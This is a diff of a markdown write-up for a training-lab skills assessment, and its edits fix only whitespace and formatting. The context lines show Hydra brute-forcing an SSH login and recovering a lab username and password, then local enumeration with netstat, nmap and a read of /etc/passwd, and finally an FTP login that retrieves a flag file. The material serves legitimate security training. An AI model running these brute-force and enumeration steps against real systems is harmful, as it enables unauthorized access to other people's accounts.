@@ -1,4 +1,4 @@
-﻿This is the second part of the skills assessment.Â `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.
+﻿This is the second part of the skills assessment.`YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.
 
 ![Pasted image 20250213160519.png](../../../../IMAGES/Pasted%20image%2020250213160519.png)
 
@@ -23,7 +23,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 21:06:
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
 [DATA] max 60 tasks per 1 server, overall 60 tasks, 200 login tries (l:1/p:200), ~4 tries per task
 [DATA] attacking ssh://94.237.54.164:36513/
-[36513][ssh] host: 94.237.54.164   login: satwossh   password: password1
+[36513][ssh] host: 94.237.54.164 login: satwossh password: password1
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -45,9 +45,9 @@ Warning: Permanently added '[94.237.54.164]:36513' (ED25519) to the list of know
 satwossh@94.237.54.164's password:
 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 6.1.0-10-amd64 x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/pro
+ * Documentation: https://help.ubuntu.com
+ * Management: https://landscape.canonical.com
+ * Support: https://ubuntu.com/pro
 
 This system has been minimized by removing packages and content that are
 not required on a system that users do not log into.
@@ -61,9 +61,9 @@ Nice, let's search the ports and active listening services, also, the home direc
 ```
  netstat -tulpn | grep LISTEN
 (No info could be read for "-p": geteuid()=1000 but you should be root.)
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
-tcp6       0      0 :::21                   :::*                    LISTEN      -               
-tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - 
+tcp6 0 0 :::21 :::* LISTEN - 
+tcp6 0 0 :::22 :::* LISTEN -
 
 
 nmap localhost
@@ -72,9 +72,9 @@ Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000076s latency).
 Other addresses for localhost (not scanned): ::1
 Not shown: 998 closed ports
-PORT   STATE SERVICE
-21/tcp open  ftp
-22/tcp open  ssh
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
 
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -149,13 +149,13 @@ Using binary mode to transfer files.
 ftp> ls
 229 Entering Extended Passive Mode (|||55297|)
 150 Here comes the directory listing.
--rw-------    1 1001     1001           28 Sep 10 09:19 flag.txt
+-rw------- 1 1001 1001 28 Sep 10 09:19 flag.txt
 226 Directory send OK.
 ftp> get flag.txt
 local: flag.txt remote: flag.txt
 229 Entering Extended Passive Mode (|||10266|)
 150 Opening BINARY mode data connection for flag.txt (28 bytes).
-100% |***********************************************************************************************************************************************************|    28      701.12 KiB/s    00:00 ETA
+100% |***********************************************************************************************************************************************************| 28 701.12 KiB/s 00:00 ETA
 226 Transfer complete.
 28 bytes received in 00:00 (157.14 KiB/s)
 ftp> exit
